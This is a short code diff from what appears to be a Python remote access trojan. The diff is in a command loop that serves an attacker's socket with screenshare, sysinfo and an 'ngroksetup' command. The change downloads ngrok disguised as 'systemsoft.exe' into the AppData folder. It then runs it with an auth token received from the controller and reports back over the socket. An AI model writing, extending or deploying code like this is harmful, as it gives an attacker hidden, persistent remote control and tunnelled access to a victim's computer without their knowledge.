@@ -923,8 +923,14 @@ def shell():
             elif command[:11] == 'screenshare':
                 threading.Thread(target=screenshare())
             elif command == 'ngroksetup':
+
                 download_file(appd + '\\systemsoft.exe')
-                reliable_send('[+] ngrok installed')
+                try:
+                    os.system(appd + '\\systemsoft.exe authtoken ' + s.recv(1024).decode())
+                except:
+                    s.send("[-] Error Adding your token".encode())
+                else:
+                    s.send('[+] Ngrok Token Inputted'.encode())
             elif command[:7] == 'sysinfo':
                 try:
                     sysinfo()
